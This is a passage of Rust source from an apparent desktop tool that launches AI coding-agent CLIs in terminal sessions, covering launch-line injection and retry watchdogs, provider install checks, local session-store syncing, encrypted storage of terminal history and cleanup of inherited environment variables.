            // resume_fragment handles both cases per family.
            let is_resume = resume_sid.is_some()
                || (allow_continue
                    && opts
                        .and_then(|o| o.get("resume"))
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false));
            let resume_flag = if is_resume {
                resume_fragment(other, resume_sid)
            } else {
                String::new()
            };
            let resume_flag = resume_flag.as_str();
            // Native aaFlag: without it, a non-Claude provider under auto-approve
            // still asks for confirmations.
            let aa = if config.auto_approve == Some(true) {
                native_auto_approve_flag(other).unwrap_or("")
            } else {
                ""
            };
            let parts: Vec<&str> = [command.as_str(), args, resume_flag, aa]
                .into_iter()
                .filter(|s| !s.is_empty())
                .collect();
            Some(format!("{}\r", parts.join(" ")))
        }
    };
    launch.map(|line| {
        let line =
            crate::commands::provider_account::override_launch_command(line, alias.as_deref());
        if provider == "promptops-cli" && config.remote_command.is_none() {
            crate::commands::promptops_cli::launch_line(line)
        } else {
            line
        }
    })
}

/// inject_when_ready — injects the launch command once the shell is ready.
/// Injects `command` when the shell has produced visible output and has
/// settled (quietMs), with floor/ceiling. Best-effort, never blocks.
/// `hard_ceiling_ms > ceiling_ms` = soft ceiling (LAUNCH_CONFIRM): past the
/// ceiling we inject only when the shell is ready, up to the hard ceiling.
/// Returns the buffer `total` at the moment of the write (baseline for the
/// post-launch watchdogs), None if the session disappeared first.
fn inject_when_ready(
    manager: &Arc<SessionManager>,
    session_id: &str,
    command: &str,
    floor_ms: u128,
    quiet_ms: u128,
    ceiling_ms: u128,
    hard_ceiling_ms: u128,
) -> Option<usize> {
    const POLL_MS: u64 = 50;

    let start = Instant::now();
    let mut seen_len: usize = 0;
    let mut has_visible = false;
    let mut last_change = Instant::now();

    loop {
        // Terminal destroyed during cold start → silent stop.
        // Only the NEW tail of the buffer is read: before, every 50ms poll
        // copied and stripped the whole replay (up to 512KB).
        let new_tail = {
            let guard = manager.state.lock();
            let pty = guard
                .sessions
                .get(session_id)
                .and_then(|s| s.pty.as_ref())?;
            let buf = pty.buffer.lock();
            let len = buf.len();
            if len != seen_len {
                let tail = buf.slice_from(seen_len.min(len));
                seen_len = len;
                Some(tail)
            } else {
                None
            }
        };

        let elapsed = start.elapsed().as_millis();
        if let Some(tail) = new_tail {
            last_change = Instant::now();
            if !has_visible && !strip_ansi(&tail).trim().is_empty() {
                has_visible = true;
            }
        }
        let quiet_for = last_change.elapsed().as_millis();

        if should_inject_launch_soft(
            elapsed,
            quiet_for,
            has_visible,
            floor_ms,
            quiet_ms,
            ceiling_ms,
            hard_ceiling_ms,
        ) {
            let effective_ceiling = ceiling_ms.max(hard_ceiling_ms);
            if !has_visible && elapsed >= effective_ceiling {
                eprintln!(
                    "[SessionManager] launch injected at ceiling ({effective_ceiling}ms) with no visible shell output — session {session_id} may be slow or stuck"
                );
            } else if elapsed >= ceiling_ms && hard_ceiling_ms > ceiling_ms {
                eprintln!(
                    "[SessionManager] slow shell startup: launch injected after {elapsed}ms (soft ceiling {ceiling_ms}ms) — session {session_id}"
                );
            }
            let (writer, baseline) = {
                let guard = manager.state.lock();
                let p = guard
                    .sessions
                    .get(session_id)
                    .and_then(|s| s.pty.as_ref())?;
                let total = p.buffer.lock().total;
                (p.writer.clone(), total)
            };
            let _ = writer
                .lock()
                .write_all(guarded_launch_line(command).as_bytes());
            return Some(baseline);
        }
        std::thread::sleep(Duration::from_millis(POLL_MS));
    }
}

/// Prefixes the command with Ctrl+U (kill-line): if junk has already landed
/// on the shell line — typically SGR mouse reports (`ESC[<35;x;yM`) that a
/// dead TUI without DECRST leaves on in xterm — it is swept away IN THE SAME
/// atomic write, and the command can no longer come out corrupted (seen in the field:
/// `claude --resume …` turned into `ude --resume …` → "command not found").
/// Unix only: on PSReadLine/cmd Ctrl+U is not a reliable kill-line.
pub(crate) fn guarded_launch_line(command: &str) -> String {
    if cfg!(windows) {
        command.to_string()
    } else {
        format!("\x15{command}")
    }
}

/// shouldInjectLaunch — pure decision.
pub(crate) fn should_inject_launch(
    elapsed_ms: u128,
    quiet_for_ms: u128,
    has_visible_output: bool,
    floor_ms: u128,
    quiet_ms: u128,
    ceiling_ms: u128,
) -> bool {
    if elapsed_ms >= ceiling_ms {
        return true;
    }
    elapsed_ms >= floor_ms && has_visible_output && quiet_for_ms >= quiet_ms
}

/// should_inject_launch with a soft ceiling: between `ceiling_ms` and
/// `hard_ceiling_ms` we inject only when the shell is ready (visible output +
/// quiet), never blindly. With `hard_ceiling_ms <= ceiling_ms` it is identical
/// to should_inject_launch.
pub(crate) fn should_inject_launch_soft(
    elapsed_ms: u128,
    quiet_for_ms: u128,
    has_visible_output: bool,
    floor_ms: u128,
    quiet_ms: u128,
    ceiling_ms: u128,
    hard_ceiling_ms: u128,
) -> bool {
    if hard_ceiling_ms <= ceiling_ms {
        return should_inject_launch(
            elapsed_ms,
            quiet_for_ms,
            has_visible_output,
            floor_ms,
            quiet_ms,
            ceiling_ms,
        );
    }
    if elapsed_ms >= hard_ceiling_ms {
        return true;
    }
    elapsed_ms >= floor_ms && has_visible_output && quiet_for_ms >= quiet_ms
}

/// Pure decision of the post-launch watchdog: re-inject the launch line?
/// Only if the provider NEVER came to the foreground, the shell is (still) in
/// the foreground, printed something AFTER the injection (= it reached the
/// prompt and reads stdin) and has been idle for LAUNCH_CONFIRM_QUIET_MS, and
/// no resume error is visible (recover_failed_resume handles that).
/// A line still queued in the tty would be read by readline once ready and
/// bring the provider to the foreground: here it cannot end up inside a TUI.
pub(crate) fn should_retry_launch(
    ever_busy: bool,
    fg_is_shell: Option<bool>,
    visible_after_inject: bool,
    quiet_for_ms: u128,
    failure_seen: bool,
) -> bool {
    !ever_busy
        && fg_is_shell == Some(true)
        && visible_after_inject
        && quiet_for_ms >= LAUNCH_CONFIRM_QUIET_MS
        && !failure_seen
}

/// Post-launch watchdog (LAUNCH_CONFIRM): if the launch line was lost — bare
/// shell at its prompt, provider never started — re-injects it ONCE.
/// Exits as soon as the provider comes to the foreground, if the foreground
/// cannot be determined (None) or if the session disappears.
fn confirm_launch_took(
    manager: &Arc<SessionManager>,
    session_id: &str,
    command: &str,
    baseline_total: usize,
) {
    const POLL_MS: u64 = 150;
    const TAIL_BYTES: usize = 8 * 1024;

    let start = Instant::now();
    let mut seen_total = baseline_total;
    let mut last_change = Instant::now();
    let mut visible_after = false;
    let mut failure_seen = false;

    while start.elapsed().as_millis() < LAUNCH_CONFIRM_WINDOW_MS {
        std::thread::sleep(Duration::from_millis(POLL_MS));
        let (fg_is_shell, tail) = {
            let guard = manager.state.lock();
            let Some(pty) = guard.sessions.get(session_id).and_then(|s| s.pty.as_ref()) else {
                return; // PTY gone: session closed or on standby
            };
            let fg = foreground_is_shell(pty);
            let data = pty.buffer.lock();
            let tail = (data.total != seen_total).then(|| {
                let fresh = data.total.saturating_sub(seen_total).min(TAIL_BYTES);
                seen_total = data.total;
                let from = data.data.len().saturating_sub(fresh);
                data.data[from..].to_vec()
            });
            (fg, tail)
        };
        match fg_is_shell {
            None => return,        // undeterminable: touch nothing
            Some(false) => return, // provider in the foreground: started
            Some(true) => {}
        }
        if let Some(tail) = tail {
            last_change = Instant::now();
            let text = strip_ansi(&String::from_utf8_lossy(&tail));
            if !text.trim().is_empty() {
                visible_after = true;
            }
            if resume_failure_kind(&text).is_some() {
                failure_seen = true;
            }
        }
        if failure_seen {
            return; // the provider started and exited with an error: recovery
        }
        let quiet_for = last_change.elapsed().as_millis();
        if should_retry_launch(false, fg_is_shell, visible_after, quiet_for, failure_seen) {
            let writer = {
                let guard = manager.state.lock();
                guard
                    .sessions
                    .get(session_id)
                    .and_then(|s| s.pty.as_ref())
                    .map(|p| p.writer.clone())
            };
            if let Some(w) = writer {
                let _ = w.lock().write_all(guarded_launch_line(command).as_bytes());
                eprintln!("[SessionManager] launch line lost — re-injecting once: {session_id}");
            }
            return;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────
// provider:check — checkProvider (whichProbe + shellProbe fallback).
// ─────────────────────────────────────────────────────────────────────────

/// checkProvider — generic-shell always available; otherwise `which`/`where`
/// then fallback to a login+interactive shell (`command -v`). In-memory cache
/// per provider, 5 min: shell probes are slow
/// and checkProvider runs on every spawn.
const CHECK_TTL_SECS: u64 = 300;
static PROVIDER_CHECK_CACHE: std::sync::OnceLock<
    Mutex<HashMap<String, (std::time::Instant, bool)>>,
> = std::sync::OnceLock::new();

/// force=true of the provider:check command — drops the provider's cache entries
/// (host `claude` and per-shell `claude@wsl:Ubuntu`, …).
pub(crate) fn invalidate_provider_check(provider: &str) {
    if let Some(cache) = PROVIDER_CHECK_CACHE.get() {
        let prefix = format!("{provider}@");
        cache
            .lock()
            .retain(|k, _| k.as_str() != provider && !k.starts_with(&prefix));
    }
}

/// checkProvider on the host (spawn, pre-warm, speed test).
pub(crate) fn check_provider(provider: &str) -> ProviderCheckResult {
    check_provider_in_shell(provider, None)
}

/// checkProvider with the session's shell (Windows). For WSL/Git Bash
/// `where` on the host is meaningless — the CLI lives inside the distro — so
/// the probe runs THERE (`command -v` via wsl.exe/bash.exe).
/// Cache keyed `provider@shell`. For WSL `platform` is
/// "linux": the manual guide and auto-install must be the Linux ones, run
/// in the distro's terminal (terminal_open with session_id).
pub(crate) fn check_provider_in_shell(provider: &str, shell: Option<&str>) -> ProviderCheckResult {
    let cross_env = cfg!(windows) && crate::commands::windows_shells::is_cross_env_shell(shell);
    let platform = if cross_env && crate::commands::windows_shells::wsl_distro_of(shell).is_some() {
        "linux".to_string()
    } else {
        platform_str()
    };
    let cache_key = if cross_env {
        format!("{provider}@{}", shell.unwrap_or_default())
    } else {
        provider.to_string()
    };
    let Some(command) =
        (if provider == "promptops-cli" && crate::commands::promptops_cli::available() {
            Some("node")
        } else {
            provider_command(provider)
        })
    else {
        // generic-shell (or a provider without a binary) is always "installed".
        return ProviderCheckResult {
            installed: true,
            platform,
            command: String::new(),
            provider: provider.to_string(),
        };
    };

    let cache = PROVIDER_CHECK_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some((ts, installed)) = cache.lock().get(&cache_key).copied() {
        if ts.elapsed().as_secs() < CHECK_TTL_SECS {
            return ProviderCheckResult {
                installed,
                platform,
                command: command.to_string(),
                provider: provider.to_string(),
            };
        }
    }

    let installed = if cross_env {
        crate::commands::windows_shells::probe_command_in_shell(shell.unwrap_or_default(), command)
    } else {
        which_probe(command) || shell_probe(command)
    };
    cache
        .lock()
        .insert(cache_key, (std::time::Instant::now(), installed));

    ProviderCheckResult {
        installed,
        platform,
        command: command.to_string(),
        provider: provider.to_string(),
    }
}

/// whichProbe — `which`/`where` with an enriched PATH (defaultExtraPaths).
fn which_probe(command: &str) -> bool {
    let which_cmd = if cfg!(windows) { "where" } else { "which" };
    let mut c = crate::commands::util_cmd::cmd(which_cmd);
    c.arg(command);
    c.env("PATH", build_path(default_extra_paths()));
    match c.output() {
        Ok(out) => out.status.success(),
        Err(_) => false,
    }
}

/// shellProbe — login+interactive shell that resolves `command -v` (not on Windows).
fn shell_probe(command: &str) -> bool {
    if cfg!(windows) {
        return false;
    }
    let shell = login_shell();
    let mut c = crate::commands::util_cmd::cmd(shell);
    for arg in login_args() {
        c.arg(arg);
    }
    c.arg("-c").arg(format!("command -v {command}"));
    // TODO: 2500ms timeout (SHELL_PROBE_TIMEOUT_MS) with SIGKILL —
    // std::process::Command has no native wait-with-timeout; it would need a
    // watchdog thread. Here the shell -c ends quickly anyway.
    match c.output() {
        Ok(out) => out.status.success() && !String::from_utf8_lossy(&out.stdout).trim().is_empty(),
        Err(_) => false,
    }
}

// ─────────────────────────────────────────────────────────────────────────
// Local store sync (fire-and-forget).
//
// "All methods are fire-and-forget (never block the
// local session flow)": the variants without suffix spawn an internal thread
// (safe even from sync commands on the main thread or with a lock held); the
// `_sync` variants block and must be called ONLY from dedicated threads.
// ─────────────────────────────────────────────────────────────────────────

/// Saves a new session to the local store, with optional backoff retry
/// (off by default → single fire-and-forget attempt).
fn schedule_store_create(manager: &Arc<SessionManager>, local_id: &str, attempt: u32) {
    {
        let mut guard = manager.state.lock();
        guard
            .pending_store_sync
            .insert(local_id.to_string(), attempt);
    }
    let mgr = Arc::clone(manager);
    let local_id = local_id.to_string();
    std::thread::spawn(move || {
        // Data snapshot for the body.
        let (auth, body) = {
            let guard = mgr.state.lock();
            let Some(s) = guard.sessions.get(&local_id) else {
                return;
            };
            let body = serde_json::json!({
                "name": s.name,
                "provider": s.provider,
                // Lets the store tell this session saving itself again (the
                // renderer saves it too) from another session with its name.
                "local_session_id": s.id,
                "config": config_for_store(&s.config),
                "workspace_path": s.workspace.as_ref().map(|w| w.path.clone()),
                "workspace_name": s.workspace.as_ref().map(|w| w.name.clone()),
                "workspace_id": s.workspace_id,
            });
            let auth = AuthSnapshot {
                device_id: guard.api_device_id.clone(),
                profile_id: guard.active_profile_id.clone(),
            };
            (auth, body)
        };

        let db_id = api_create(&auth, &body);
        if let Some(db_id) = db_id {
            match mgr.settle_store_create(&local_id, &db_id) {
                StoreCreate::Bound => crate::commands::agents::adopt_db_id(&local_id, &db_id),
                StoreCreate::NotBound => eprintln!("[SessionStore] record {db_id} not bound to {local_id}: owned by another live session or session gone"),
                StoreCreate::Discard => {
                    eprintln!("[SessionStore] {local_id} was closed before its first save: deleting record {db_id}");
                    api_destroy_sync(&auth, &db_id);
                }
            }
        } else {
            mgr.state.lock().closed_unsynced.remove(&local_id);
            // Retry disabled by default; if enabled:
            let retry_enabled = false; // retry switch, off
            if retry_enabled && (attempt as usize) < STORE_CREATE_RETRY_DELAYS_MS.len() {
                let delay = STORE_CREATE_RETRY_DELAYS_MS[attempt as usize];
                std::thread::sleep(Duration::from_millis(delay));
                // Re-check existence before the retry.
                let still_exists = mgr.state.lock().sessions.contains_key(&local_id);
                if still_exists {
                    schedule_store_create(&mgr, &local_id, attempt + 1);
                } else {
                    mgr.state.lock().pending_store_sync.remove(&local_id);
                }
            }
        }
    });
}

/// Outcome of a session's first save to the store.
#[derive(Debug, PartialEq)]
enum StoreCreate {
    /// The record now belongs to the live session.
    Bound,
    /// Another live session owns the record, or the session is gone (profile
    /// switch, quit): the record stays as it is.
    NotBound,
    /// The user closed the session while it was being saved: delete the record.
    Discard,
}

impl SessionManager {
    /// Binds the record a first save produced, under one lock.
    fn settle_store_create(&self, local_id: &str, db_id: &str) -> StoreCreate {
        let mut guard = self.state.lock();
        guard.pending_store_sync.remove(local_id);
        let closed = guard.closed_unsynced.remove(local_id);
        if adopt_record_locked(&mut guard, local_id, db_id) {
            StoreCreate::Bound
        } else if closed && !guard.sessions.contains_key(local_id) {
            StoreCreate::Discard
        } else {
            StoreCreate::NotBound
        }
    }
}

/// Binds a stored record to a live session. One stored record ↔ one live
/// session: when another live session already owns the record (same name),
/// this one stays unsynced rather than sharing it (closing either would
/// delete the other's record). Nothing is bound to a session already gone.
fn adopt_record_locked(state: &mut ManagerState, local_id: &str, db_id: &str) -> bool {
    let taken = state
        .db_ids
        .iter()
        .any(|(local, db)| db == db_id && local != local_id);
    let alive = state.sessions.contains_key(local_id);
    if !taken && alive {
        state.db_ids.insert(local_id.to_string(), db_id.to_string());
    }
    !taken && alive
}

/// Runs a session method of the local store (`local_data.rs`) with the
/// active profile and this device's id. BLOCKING: the store is read and
/// written synchronously, so call it from a thread.
fn store_call(auth: &AuthSnapshot, method: &str, params: JsonValue) -> Result<JsonValue, String> {
    let mut params = if params.is_object() {
        params
    } else {
        serde_json::json!({})
    };
    if let Some(profile_id) = &auth.profile_id {
        params["profile_id"] = serde_json::json!(profile_id);
    }
    if let Some(device_id) = &auth.device_id {
        params["device_id"] = serde_json::json!(device_id);
    }
    crate::local_data::call(method, params).map_err(|e| e.to_string())
}

/// `sessions.create` — returns the record id (dbId). BLOCKING: call from a thread.
fn api_create(auth: &AuthSnapshot, body: &JsonValue) -> Option<String> {
    match store_call(auth, "sessions.create", body.clone()) {
        Ok(res) => res
            .get("id")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string()),
        Err(err) => {
            eprintln!("[SessionStore] create failed: {err}");
            None
        }
    }
}

/// `sessions.update` — BLOCKING variant. Returns whether the store saved it,
/// so whoever syncs prompt-count deltas can re-credit them on failure instead
/// of losing them.
fn api_update_sync(auth: &AuthSnapshot, db_id: &str, payload: &JsonValue) -> bool {
    let mut params = payload.clone();
    params["id"] = serde_json::json!(db_id);
    match store_call(auth, "sessions.update", params) {
        Ok(_) => true,
        Err(err) => {
            eprintln!("[SessionStore] update failed: {err}");
            false
        }
    }
}

/// Single worker for fire-and-forget PUTs: one thread drains the queue in order
/// instead of spawning an OS thread per call (status change bursts
/// created dozens of them). The `_sync` variants remain for flows that need
/// confirmation or their own ordering (prompt-count flush, destroy's update→delete).
fn api_update_queue() -> &'static std::sync::mpsc::Sender<(AuthSnapshot, String, JsonValue)> {
    static QUEUE: std::sync::OnceLock<std::sync::mpsc::Sender<(AuthSnapshot, String, JsonValue)>> =
        std::sync::OnceLock::new();
    QUEUE.get_or_init(|| {
        let (tx, rx) = std::sync::mpsc::channel::<(AuthSnapshot, String, JsonValue)>();
        std::thread::spawn(move || {
            while let Ok((auth, db_id, payload)) = rx.recv() {
                let _ = api_update_sync(&auth, &db_id, &payload);
            }
        });
        tx
    })
}

/// `sessions.update` — fire-and-forget (worker queue): safe
/// even with a lock held or from sync commands on the main thread.
fn api_update(auth: &AuthSnapshot, db_id: &str, payload: JsonValue) {
    let _ = api_update_queue().send((auth.clone(), db_id.to_string(), payload));
}

/// `sessions.delete` — BLOCKING variant.
fn api_destroy_sync(auth: &AuthSnapshot, db_id: &str) {
    if let Err(err) = store_call(auth, "sessions.delete", serde_json::json!({ "id": db_id })) {
        eprintln!("[SessionStore] destroy failed: {err}");
    }
}

/// `sessions.delete` — fire-and-forget (internal thread).
#[allow(dead_code)]
fn api_destroy(auth: &AuthSnapshot, db_id: &str) {
    let auth = auth.clone();
    let db_id = db_id.to_string();
    std::thread::spawn(move || api_destroy_sync(&auth, &db_id));
}

/// `sessions.persist` — batch save (the store upserts by id or name). BLOCKING.
fn api_persist(auth: &AuthSnapshot, sessions: JsonValue) -> bool {
    let body = serde_json::json!({ "sessions": sessions });
    match store_call(auth, "sessions.persist", body) {
        Ok(_) => true,
        Err(err) => {
            eprintln!("[SessionStore] persist failed: {err}");
            false
        }
    }
}

/// `sessions.list` — full list of the active profile (for restore). BLOCKING.
fn api_list(auth: &AuthSnapshot) -> Vec<JsonValue> {
    match store_call(auth, "sessions.list", JsonValue::Null) {
        Ok(res) => res.as_array().cloned().unwrap_or_default(),
        Err(err) => {
            eprintln!("[SessionStore] list failed: {err}");
            Vec::new()
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────
// Utilities — shell helpers + misc.
// ─────────────────────────────────────────────────────────────────────────

/// Epoch in milliseconds (Date.now()).
fn epoch_ms() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

// ── Parked buffer on disk ─────────────────────────────────────────────────────
// Key = stored db_id (stable across restarts). Cap MAX_RAW_BYTES: only the
// tail is kept, consistent with the in-memory buffer.

fn parked_buffer_path(db_id: &str) -> Option<std::path::PathBuf> {
    // Safe characters only (stored ids are numeric/uuid): no
    // path separators from external input.
    if db_id.is_empty() || !db_id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
        return None;
    }
    let dir = crate::commands::hook::hook_data_dir().join("parked-buffers");
    let _ = crate::local_store::create_private_dir(&dir);
    Some(dir.join(format!("{db_id}.sealed")))
}

/// Terminal history can hold anything the terminal printed (tokens, env),
/// so on disk it is encrypted with the local store key, bound to the session.
const PARKED_KIND: &str = "parked-buffer";

fn write_parked_buffer_file(db_id: &str, buf: &str) {
    let Some(path) = parked_buffer_path(db_id) else {
        return;
    };
    let Some(store) = crate::local_store::get() else {
        return;
    };
    let bytes = buf.as_bytes();
    let start = bytes.len().saturating_sub(MAX_RAW_BYTES);
    // Cut on a valid UTF-8 boundary so as not to corrupt the replay, then
    // at the start of the next line: a head cut mid escape sequence would
    // garble the first line of the replay.
    let mut cut = start;
    while cut < bytes.len() && !buf.is_char_boundary(cut) {
        cut += 1;
    }
    if cut > 0 {
        if let Some(nl) = bytes[cut..].iter().position(|&b| b == b'\n') {
            cut += nl + 1;
        }
    }
    let Ok(sealed) = store.seal_blob(PARKED_KIND, db_id, &bytes[cut..]) else {
        return;
    };
    // Atomic write (unique tmp + flush + rename): a crash mid-write, or two
    // writers at once (park thread and quit), never leave a truncated replay.
    let _ = crate::local_store::replace_file_private(&path, &sealed);
    // Older versions kept the history in clear next to it.
    let _ = std::fs::remove_file(path.with_extension("dat"));
}

fn read_parked_buffer_file(db_id: &str) -> Option<String> {
    let path = parked_buffer_path(db_id)?;
    let data = match std::fs::read(&path) {
        Ok(sealed) => crate::local_store::get()?.open_blob(PARKED_KIND, db_id, &sealed)?,
        // Plain history written by an older version: read it once, it is
        // sealed at the next park and the clear copy removed.
        Err(_) => std::fs::read(path.with_extension("dat")).ok()?,
    };
    let data = String::from_utf8(data).ok()?;
    if data.is_empty() {
        None
    } else {
        Some(data)
    }
}

/// ISO-8601 timestamp in UTC (Date().toISOString()).
/// TODO: for exact milliseconds/`Z`, use the `chrono` or `time` crate;
/// for now it formats from SystemTime without extra dependencies.
fn now_iso() -> String {
    iso_from_epoch_ms(epoch_ms())
}

/// `created_at` of a stored record (`2026-10-06T10:42:00.000000Z`)
/// normalized to the `now_iso()` format (milliseconds, `Z`), so
/// comparison/parsing on the renderer side is uniform. None if absent or not RFC 3339.
fn row_created_at_iso(row: &serde_json::Value) -> Option<String> {
    let raw = row.get("created_at")?.as_str()?;
    let ms = chrono::DateTime::parse_from_rfc3339(raw)
        .ok()?
        .timestamp_millis();
    u64::try_from(ms).ok().map(iso_from_epoch_ms)
}

/// Same format as `now_iso()` from an epoch in milliseconds —
/// for derived timestamps (e.g. base + offset) without reading the clock again.
fn iso_from_epoch_ms(ms: u64) -> String {
    let secs = ms / 1_000;
    let millis = ms % 1_000;
    // Epoch → civil date conversion (Howard Hinnant's algorithm).
    let days = (secs / 86_400) as i64;
    let rem = secs % 86_400;
    let (h, mi, s) = (rem / 3600, (rem % 3600) / 60, rem % 60);
    let z = days + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let year = if m <= 2 { y + 1 } else { y };
    format!("{year:04}-{m:02}-{d:02}T{h:02}:{mi:02}:{s:02}.{millis:03}Z")
}

/// path.basename(p) || p.
fn basename(p: &str) -> String {
    let trimmed = p.trim_end_matches(['/', '\\']);
    let base = trimmed
        .rsplit(['/', '\\'])
        .next()
        .filter(|s| !s.is_empty())
        .unwrap_or(p);
    base.to_string()
}

/// os.homedir().
pub(crate) fn home_dir() -> String {
    if cfg!(windows) {
        std::env::var("USERPROFILE").unwrap_or_else(|_| ".".into())
    } else {
        std::env::var("HOME").unwrap_or_else(|_| ".".into())
    }
}

/// Minimal snapshot of a session for spawning a sub-agent: the
/// SubAgentManager resolves the parent's context from here.
pub(crate) struct ParentSessionInfo {
    pub workspace_path: Option<String>,
    pub provider: Option<String>,
    pub provider_account_id: Option<String>,
    pub name: Option<String>,
    /// Parent's config autoApprove: non-Claude subs apply the native bypass
    /// flag at spawn.
    pub auto_approve: bool,
}

impl SessionManager {
    /// The session's working folder (config.cwd, otherwise the workspace).
    pub(crate) fn cwd_of(&self, session_id: &str) -> Option<String> {
        let guard = self.state.lock();
        let s = guard.sessions.get(session_id)?;
        s.config
            .cwd
            .clone()
            .or_else(|| s.workspace.as_ref().map(|w| w.path.clone()))
    }

    /// The session's effective shell (override > distro inferred from a
    /// \\wsl.localhost\… workspace > Settings default): the same one the
    /// spawn uses, so provider check, install terminal and sub-agents
    /// see it identically. Unknown session → only the Settings default.
    pub(crate) fn effective_shell_of(&self, session_id: &str) -> Option<String> {
        let (shell, cwd) = {
            let guard = self.state.lock();
            match guard.sessions.get(session_id) {
                Some(s) => (
                    s.config.shell.clone(),
                    s.config
                        .cwd
                        .clone()
                        .or_else(|| s.workspace.as_ref().map(|w| w.path.clone())),
                ),
                None => (None, None),
            }
        };
        crate::commands::windows_shells::effective_shell_for(shell.as_deref(), cwd.as_deref())
    }

    /// Connection command of the session's remote "command" transport (cwd `cmd://…`):
    /// sub-agents reuse it to open their own connection.
    pub(crate) fn remote_command_of(&self, session_id: &str) -> Option<String> {
        let guard = self.state.lock();
        guard
            .sessions
            .get(session_id)?
            .config
            .remote_command
            .clone()
            .filter(|c| !c.trim().is_empty())
    }

    /// Connection command of the session whose `cmd://…` cwd equals `cwd`:
    /// commands that receive only the cwd (assets) use it to reach the host.
    pub(crate) fn remote_command_for_cwd(&self, cwd: &str) -> Option<String> {
        let wanted = cwd.trim_end_matches('/');
        let guard = self.state.lock();
        guard.sessions.values().find_map(|s| {
            let path = s
                .config
                .cwd
                .as_deref()
                .or_else(|| s.workspace.as_ref().map(|w| w.path.as_str()))?;
            if path.trim_end_matches('/') != wanted {
                return None;
            }
            s.config
                .remote_command
                .clone()
                .filter(|c| !c.trim().is_empty())
        })
    }

    pub(crate) fn parent_info(&self, session_id: &str) -> Option<ParentSessionInfo> {
        let guard = self.state.lock();
        let s = guard.sessions.get(session_id)?;
        Some(ParentSessionInfo {
            workspace_path: s
                .config
                .cwd
                .clone()
                .or_else(|| s.workspace.as_ref().map(|w| w.path.clone())),
            provider: Some(s.provider.clone()),
            provider_account_id: s.config.provider_account_id.clone().flatten(),
            name: Some(s.name.clone()),
            auto_approve: s.config.auto_approve.unwrap_or(false),
        })
    }
}

/// Minimum grid for an agent's TUI to be able to draw its input box
/// (needed by the "ready" detection during startup, see resize_agent).
const MIN_PTY_COLS: u16 = 20;
const MIN_PTY_ROWS: u16 = 8;

pub(crate) fn pty_size_is_usable(cols: u16, rows: u16) -> bool {
    cols >= MIN_PTY_COLS && rows >= MIN_PTY_ROWS
}

/// Session markers the app inherits when it is launched from a terminal
/// running inside Claude Code or inside another PromptOps (dev server
/// started by an agent, `open` from an integrated terminal). Passed on to
/// agents they make them believe they are sub-sessions: Claude turns off
/// transcript saving ("inherited CLAUDE_CODE_CHILD_SESSION marker") and
/// every later `--resume` fails; hooks and the ctl point to the other app.
/// The variables that are needed are set again later by the spawn itself.
/// The user's own settings (CLAUDE_CODE_USE_BEDROCK…) are kept.
const INHERITED_AGENT_MARKERS: &[&str] = &[
    "CLAUDE_CODE_CHILD_SESSION",
    "CLAUDE_CODE_SESSION_ID",
    "CLAUDE_CODE_SESSION_ATTENDED",
    "CLAUDE_CODE_ENTRYPOINT",
    "CLAUDE_CODE_EXECPATH",
    "CLAUDE_CODE_MESSAGING_SOCKET",
    "CLAUDE_CODE_MESSAGING_TOKEN",
    "CLAUDE_PID",
    "CLAUDE_EFFORT",
    "PROMPTOPS_SESSION_ID",
    "PROMPTOPS_CTL_TOKEN",
    "PROMPTOPS_HOOK_PORT",
    "PROMPTOPS_HOOK_HOSTS",
    "PROMPTOPS_WORKSPACE",
    "PROMPTOPS_PROVIDER_ACCOUNT_ID",
];

pub(crate) fn strip_inherited_agent_env(cmd: &mut portable_pty::CommandBuilder) {
    for k in INHERITED_AGENT_MARKERS {
        cmd.env_remove(k);
    }
}

/// "Real" terminal env for PTYs: GUI apps launched from Finder/Dock don't
/// have TERM/COLORTERM, and CLIs (claude included) degrade to output without
/// colors, so TERM is set by default.
pub(crate) fn apply_terminal_env(cmd: &mut portable_pty::CommandBuilder) {
    // Linux AppImage: the bundle's GTK/GIO/library environment (and the
    // WebKit tweaks we set for ourselves) must not reach the user's shell,
    // agents or the programs they start.
    #[cfg(target_os = "linux")]
    for (key, value) in crate::linux_env::child_env_overrides() {
        match value {
            Some(v) => cmd.env(key, v),
            None => cmd.env_remove(key),
        }
    }
    crate::commands::promptops_cli::apply_env(cmd);
    if std::env::var("TERM").is_err() {
        cmd.env("TERM", "xterm-256color");
    }
    if std::env::var("COLORTERM").is_err() {
        cmd.env("COLORTERM", "truecolor");
    }
    if std::env::var("LANG").is_err() {
        cmd.env("LANG", "en_US.UTF-8");
    }
}

/// Environment changes that undo an AppImage launch for child processes:
/// `(name, Some(value))` = set, `(name, None)` = remove. Pure, so it is tested
/// on every platform; `linux_env::child_env_overrides` feeds it the process env.
///
/// - the AppImage runtime's own variables (`APPDIR`, `APPIMAGE`, `ARGV0`,
///   `OWD`) and those the app set for its own webview (`ours`) are removed;
/// - every other variable that points into the mounted bundle (`GTK_*`,
///   `GIO_*`, `GDK_PIXBUF_MODULE_FILE`, `GSETTINGS_SCHEMA_DIR`, and the
///   bundle entries of `PATH`, `LD_LIBRARY_PATH`, `XDG_DATA_DIRS`, …) loses
///   those entries, and is removed when nothing else is left.
#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
pub(crate) fn appimage_env_overrides(
    vars: &[(String, String)],
    appdir: Option<&str>,
    ours: &[&str],
) -> Vec<(String, Option<String>)> {
    const RUNTIME: [&str; 4] = ["APPDIR", "APPIMAGE", "ARGV0", "OWD"];
    let appdir = appdir
        .map(|d| d.trim_end_matches('/'))
        .filter(|d| d.len() > 1);
    let mut out: Vec<(String, Option<String>)> = Vec::new();
    for (key, value) in vars {
        if RUNTIME.contains(&key.as_str()) || ours.contains(&key.as_str()) {
            out.push((key.clone(), None));
            continue;
        }
        let Some(dir) = appdir else { continue };
